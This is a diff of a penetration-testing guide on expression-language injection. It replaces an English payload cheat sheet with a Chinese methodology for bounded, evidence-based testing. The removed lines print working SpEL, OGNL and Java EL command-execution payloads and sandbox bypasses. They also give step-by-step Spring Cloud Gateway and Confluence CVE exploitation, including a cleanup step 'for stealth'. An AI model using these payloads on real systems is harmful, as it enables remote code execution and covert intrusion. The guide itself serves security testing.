@@ -1,231 +1,60 @@
-# expression-language-injection
+# 模板、表达式与延迟解释执行
 
-路线选择、组件/通用机制研究、OOB 与有界停止见 [技术路线研究](../rules/technical-route-research.md)。
+从 [技术路线研究](../rules/technical-route-research.md) 进入；查询语法用 [查询机制](injection-test.md)，恢复对象用 [对象恢复](deserialization-test.md)。本篇关注不可信文本在什么身份和阶段成为指令，不以一次算术结果、报错或外连认定 RCE。
 
-# Expression Language Injection
+## 先找解释器和信任边界
 
+正例：自己的邮件模板、报表、通知规则、脚本配置或表达式字段保存后被服务端预览/发送/导出/任务执行；请求参数也可能被即时求值。需要有可控字段、正常业务、具体消费者和可观察结果。反例：模板菜单、字符串插值回显、前端 JavaScript 自行计算、产品允许的计算器公式，或仅管理员本职可运行的脚本；它们不自动构成越界执行。
 
-## 1. DETECTION — POLYGLOT PROBES
+记录当前身份、字段路径及上下文：模板正文还是变量值，完整表达式还是引号/字符串内，属性访问还是方法名，脚本内容还是固定命令的普通参数；URL/JSON 编码发生在哪一层。正常输入决定语法，不能将 Jinja、SpEL、OGNL、Shell 标点混在一包后从单次报错猜引擎。
 
-```text
-${7*7}              → 49 = SpEL, OGNL, or Java EL
-#{7*7}              → 49 = SpEL (alternative syntax) or JSF EL
-%{7*7}              → 49 = OGNL (Struts2)
-${T(java.lang.Math).random()}  → random float = SpEL confirmed
-%{#context}         → object dump = OGNL confirmed
-```
+**一次推理示例**：保存后界面仍显示原文，导出结果出现计算值。竞争解释包括“导出服务解释了模板”“浏览器或客户端 SDK 先计算”“读到了上一份缓存产物”。下一步：用唯一无害标记新建自己的对象，保存后读取原始字段；分别取原始 HTTP 导出响应和不触发导出的对象；关联版本/任务。只有本次原始服务端产物随触发变化，才支持延迟服务端解释；能算术仍不等于能跨上下文读取或执行。
 
-### Disambiguation
+## 保存 → 触发 → 观察
 
-| Response to `${7*7}` | Response to `%{7*7}` | Engine |
+| 步骤 | 有界操作与关联 | 反例/不能替代的证据 |
 |---|---|---|
-| 49 | literal `%{7*7}` | SpEL or Java EL |
-| literal `${7*7}` | 49 | OGNL (Struts2) |
-| 49 | 49 | Both may be active |
+| 正常基线 | 用自己的测试对象完成一次合法流程，记录保存请求、对象 ID/版本、消费者身份和正常产物 | 只知道字段可写，尚不知道谁何时消费 |
+| 保存 | 在一个已定位的字段放唯一无害标记或一种与当前语法相符的无副作用表达式；读回原始存储值 | 保存 200、内容被截断/清洗、页面渲染变化，都不证明服务端求值 |
+| 触发 | 选择实际存在的预览、渲染、发送给自己、导出、规则执行或自己的异步任务；记录请求/任务及触发时间 | 保存本身可能不触发；队列接受不是任务已执行；禁止把未知计划任务当作已触发 |
+| 观察 | 比对原始响应、自己收到的消息、生成文件、自己的任务记录或已提供的 OOB；限定窗口并关联标记 | 浏览器 DOM、旧邮件/旧文件、缓存结果、其他会话回连不能归到本样本 |
+| 对照 | 保持同字段/身份/对象条件，比较普通文本、合法表达式、缺少触发动作；按需增加已知不应被解释的字段 | 大量不同语法同时变化无法区分引擎、编码、缓存和 WAF |
+| 收束 | 说明到达解释器的阶段及可访问对象/能力，或写清无法触发、不可观察、配置不明的 blocker | 单次错误、反射类名、算术输出只是阶段证据，不自动支持敏感读取或命令执行 |
 
----
+非每次都要新增对象/对照：复用已可靠记录的正常基线，挑能区分当前竞争解释的最小一步。异步观察遵守路线预算与窗口；不盲目等候或连续轮询补偿未知消费者。
 
-## 2. SpEL (SPRING EXPRESSION LANGUAGE)
+## 从求值到可证明的危害
 
-### Where SpEL Appears
+1. **确认解释**：选择当前语法中的无害常量表达式或字段引用，验证输出依赖输入且来自服务端消费者。模板中的普通变量替换、转义后的字面量和公式功能的预期计算先归正常行为。
+2. **确认上下文**：只沿已暴露的变量、对象、属性访问器、函数/方法或脚本接口探索；用自己的可控值判断可达范围。类型名、错误中的对象名、源码里存在某方法都不是可调用证据。
+3. **区分越界**：比较谁能编辑、谁执行、以谁的权限执行，是否访问了该身份本不该接触的对象/能力。只读自己的模板变量没有跨界；如果设计允许普通用户写受限表达式，需证明突破其实际限制，不能因“能计算”就报告注入。
+4. **最小影响证明**：有可靠前提时选择获准的受控读取、可回滚状态变化或无破坏性执行标记；读取敏感系统文件、长延迟、真实收件人或真实业务副作用不是默认完成条件。缺执行通路时停止在已证能力，不用换一组历史沙箱逃逸链补齐危害。
 
-- `@Value("${...}")` annotations
-- Spring Security expressions (`@PreAuthorize`)
-- Spring Cloud Gateway route predicates and filters
-- Thymeleaf `th:text="${...}"` (when combined with `__${...}__` preprocessing)
-- Spring Data `@Query` with SpEL
+内容差分优先来自本次服务端产物；错误须区分模板语法、属性不存在、权限拒绝、渲染器崩溃和上游业务错误；时间变化须有重复基线、交错对照、最小等待与限量，排除队列/网络/缓存噪声。OOB 只证明相应交互，工具与关联规则见公共路线文档。
 
-### RCE via Runtime.exec
+## 引擎分支：先确认配置，再选参考
 
-```java
-${T(java.lang.Runtime).getRuntime().exec("id")}
-```
-
-### RCE with Output Capture (Commons IO)
-
-```java
-${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec("id").getInputStream())}
-```
-
-### RCE with Output Capture (Spring StreamUtils)
-
-```java
-#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec('whoami').getInputStream()))}
-```
-
-### ProcessBuilder (alternative when Runtime is blocked)
-
-```java
-${new java.lang.ProcessBuilder(new String[]{"id"}).start()}
-```
-
-### Spring Cloud Gateway — CVE-2022-22947
-
-Exploit via actuator to add malicious route with SpEL filter:
-
-```bash
-# Step 1: Add route with SpEL in filter (with output capture)
-POST /actuator/gateway/routes/hacktest
-Content-Type: application/json
-{
-  "id": "hacktest",
-  "filters": [{
-    "name": "AddResponseHeader",
-    "args": {
-      "name": "Result",
-      "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec('whoami').getInputStream()))}"
-    }
-  }],
-  "uri": "http://example.com",
-  "predicates": [{"name": "Path", "args": {"_genkey_0": "/hackpath"}}]
-}
-
-# Step 2: Refresh routes to apply
-POST /actuator/gateway/refresh
-
-# Step 3: Trigger the route
-GET /hackpath
-# Response header "Result" contains command output
-
-# Step 4: Clean up (important for stealth)
-DELETE /actuator/gateway/routes/hacktest
-POST /actuator/gateway/refresh
-```
-
-### SpEL Sandbox Bypass
-
-When `SimpleEvaluationContext` is used (restricts `T()` operator):
-
-```java
-// Try reflection-based bypass:
-${''.class.forName('java.lang.Runtime').getMethod('exec',''.class).invoke(''.class.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id')}
-```
-
----
-
-## 3. OGNL (OBJECT-GRAPH NAVIGATION LANGUAGE)
-
-### Where OGNL Appears
-
-- Apache Struts2 — primary OGNL consumer
-- Confluence Server — uses OGNL in certain request paths
-- Any Java app using `ognl.Ognl.getValue()` or `ognl.Ognl.setValue()`
-
-### Basic RCE
-
-```
-%{(#cmd='id').(#rt=@java.lang.Runtime@getRuntime()).(#rt.exec(#cmd))}
-```
-
-### Struts2 Sandbox Bypass — _memberAccess Manipulation
-
-Struts2 restricts OGNL via `SecurityMemberAccess`. Classic bypass clears restrictions:
-
-```
-%{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/sh','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
-```
-
-### Struts2 OgnlUtil Blacklist Clear
-
-Later Struts2 versions use class/package blacklists. Bypass by clearing `excludedClasses` and `excludedPackageNames`:
-
-```
-%{(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.excludedClasses.clear()).(#ognlUtil.excludedPackageNames.clear()).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(#cmd='id').(#rt=@java.lang.Runtime@getRuntime().exec(#cmd))}
-```
-
-### Key Struts2 CVEs
-
-| CVE | Vector | Payload Location |
+| 现场证据支持的解释器 | 要核对的前提与有用的区别 | 不应沿用的捷径 |
 |---|---|---|
-| S2-045 (CVE-2017-5638) | Content-Type header | `%{...}` in Content-Type |
-| S2-046 (CVE-2017-5638) | Multipart filename | OGNL in upload filename |
-| S2-016 (CVE-2013-2251) | `redirect:` / `redirectAction:` prefix | URL parameter |
-| S2-048 (CVE-2017-9791) | Struts Showcase | ActionMessage with OGNL |
-| S2-057 (CVE-2018-11776) | Namespace OGNL | URL path |
+| Jinja/Twig/FreeMarker 等模板 | 实际语法、文本/表达式上下文、变量暴露、沙箱/转义与自定义 helper；区分传入模板源码和作为数据传入 | `{{...}}`、`${...}` 或某个数字结果不能唯一识别引擎；不硬编码类索引或通用反射链 |
+| JSP EL/JSF/OGNL | 是否再次解释用户文本、上下文对象、成员访问策略、框架版本与真实调用；单纯输出字符串不构成二次求值 | Struts/Confluence 指纹、老 CVE 路径或清空成员限制的片段不表示当前适用 |
+| SpEL | `parseExpression` 是否处理不可信文本，实际 evaluation context、root、accessor、resolver、变量/函数及授权 | 类路径里有 Spring 不等于入口；不把 `SimpleEvaluationContext` 说成通用反射逃逸，也不称其绝对无副作用 |
+| JS/规则/脚本引擎 | 脚本与数据边界、隔离方式、注入对象/函数、执行身份和时间/资源限制 | 功能本来就允许的脚本执行不等于漏洞；库名或插件名不证明沙箱可逃逸 |
+| 外部命令/转换工具 | 实际 argv/字符串拼接、shell 是否参与、可控位置、固定参数与工具特有解释 | 参数包含 `;`/管道符但被当普通参数处理，不等于经过 shell；转换失败不等于执行 |
 
-### Confluence OGNL — CVE-2021-26084
+### SpEL 的上下文区别
 
-Confluence Server allows OGNL injection via the `queryString` or action parameters:
+核对的 Spring Framework 7.1 文档说明：`StandardEvaluationContext` 提供完整 SpEL 能力；`SimpleEvaluationContext` 排除 Java 类型引用、构造器和 bean 引用，并要求显式选择属性访问/方法解析配置。是否能访问危险能力仍取决于暴露的 root、accessor、resolver、变量/函数/方法；“只读属性访问”不等于 getter 无副作用。研究应沿实际配置中的能力收束，不把历史 `getClass`/反射片段视为可靠通用绕过。
 
-```bash
-POST /pages/createpage-entervariables.action
-Content-Type: application/x-www-form-urlencoded
+最小区分实验：已确认合法表达式可求值时，先比较自己的普通属性读取、应用明确允许的方法及拒绝结果，判断实际暴露面。要推断更强能力必须有该对象/方法可达的证据；未确认上下文就记录 blocker，而非从算术直接跳到命令链。
 
-queryString=%5cu0027%2b%7b3*3%7d%2b%5cu0027
-# URL-decoded: \u0027+{3*3}+\u0027
-# If response contains 9 → confirmed
-# Escalate to Runtime.exec for RCE
-```
+### 有组件源码或历史公告时
 
----
+沿正常请求定位“保存字段 → 读取字段 → 解析/渲染函数 → evaluation context/模板配置 → 消费者身份”，查条件分支、默认配置与当前版本修复。源码让下一实验更窄，不代替目标触发。Gateway 路由表达式、Confluence/Struts 模板等历史案例只有在组件版本、配置、鉴权、真实入口及消费者符合时才是候选；创建/刷新路由等有状态动作必须具备获准且可回滚的测试对象，否则 blocker，不照抄公告步骤。
 
-## 4. JAVA EL (JSP / JSF)
+文件在预览/转换中才被解释时先用 [文件生命周期](file-upload-test.md) 定位消费者；解释后发生 URL 获取用 [资源获取](ssrf-test.md) 确认请求能力；恢复后字符串化触发用 [对象恢复](deserialization-test.md)。跨族由证据推进，不因一个字段叫 template 就把三类全测一遍。
 
-### Where Java EL Appears
+## 来源与适用性
 
-- JSP pages: `${expression}` and `#{expression}`
-- JSF (JavaServer Faces): value and method bindings
-- Custom tag libraries
-
-### RCE Payloads
-
-```java
-// Java EL with Runtime:
-${Runtime.getRuntime().exec("id")}
-
-// Via pageContext (JSP):
-${pageContext.request.getServletContext().getClassLoader()}
-
-// Reflection-based:
-${"".getClass().forName("java.lang.Runtime").getMethod("exec","".getClass()).invoke("".getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")}
-```
-
----
-
-## 5. DETECTION METHODOLOGY
-
-```
-Input reflected and ${7*7} returns 49?
-├── Java application?
-│   ├── Struts2? → Try %{...} OGNL payloads
-│   │   └── Check Content-Type injection (S2-045)
-│   ├── Spring? → Try T(java.lang.Runtime) SpEL
-│   │   └── Check /actuator/gateway (Spring Cloud Gateway)
-│   ├── Confluence? → Try OGNL via action parameters
-│   └── JSP/JSF? → Try Java EL payloads
-│
-├── Error messages reveal framework?
-│   ├── "ognl.OgnlException" → OGNL
-│   ├── "SpelEvaluationException" → SpEL
-│   └── "javax.el.ELException" → Java EL
-│
-└── Blocked by sandbox?
-    ├── OGNL: clear _memberAccess / excludedClasses
-    ├── SpEL: reflection bypass for SimpleEvaluationContext
-    └── Try alternative exec methods (ProcessBuilder, ScriptEngine)
-```
-
----
-
-## 6. QUICK REFERENCE
-
-```text
-# SpEL RCE:
-${T(java.lang.Runtime).getRuntime().exec("id")}
-
-# OGNL RCE (Struts2):
-%{(#rt=@java.lang.Runtime@getRuntime()).(#rt.exec('id'))}
-
-# OGNL with sandbox bypass:
-%{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#rt=@java.lang.Runtime@getRuntime()).(#rt.exec('id'))}
-
-# Java EL RCE:
-${"".getClass().forName("java.lang.Runtime").getMethod("exec","".getClass()).invoke("".getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")}
-
-# Confluence CVE-2021-26084 probe:
-queryString=\u0027%2b{3*3}%2b\u0027
-
-# Spring Cloud Gateway CVE-2022-22947:
-POST /actuator/gateway/routes/x  → SpEL in filter args
-POST /actuator/gateway/refresh
-```
+- 2026-11-25 核对 [Spring Framework SpEL Evaluation](https://docs.spring.io/spring-framework/reference/core/expressions/evaluation.html)，页面当时为 7.1.0；只用于上述 context 配置与安全语义，**未对目标或代表性本地应用实测**，旧版本需查对应文档及实际配置。
+- 其他引擎/历史组件仅列研究分支，不声明具体版本利用兼容性；要修改 API/默认配置或执行某历史链，先核对相应版本的一手文档与现场前提。
